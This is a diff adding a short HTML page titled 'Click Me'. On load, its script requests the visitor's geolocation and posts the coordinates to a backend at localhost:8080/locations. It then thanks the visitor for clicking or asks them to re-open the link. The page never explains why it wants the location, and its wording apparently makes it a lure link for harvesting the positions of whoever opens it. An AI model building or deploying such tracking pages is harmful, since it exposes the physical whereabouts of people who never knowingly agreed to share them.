@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Click Me</title>
+</head>
+<body>
+<script>
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // Send the location data to your Spring Boot backend
+            sendLocationToBackend(latitude, longitude);
+        });
+    } else {
+        alert("Geolocation is not available in your browser.");
+    }
+
+    function sendLocationToBackend(latitude, longitude) {
+        // Send an HTTP POST request to your Spring Boot endpoint
+        fetch('http://localhost:8080/locations', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ latitude, longitude })
+        })
+        .then(response => {
+            if (response.ok) {
+                alert('Thanks for Clicking Me.');
+            } else {
+                alert('Please Re-Open the link.');
+            }
+        })
+        .catch(error => {
+            console.error('Error sending location data:', error);
+        });
+    }
+</script>
+</body>
+</html>
+
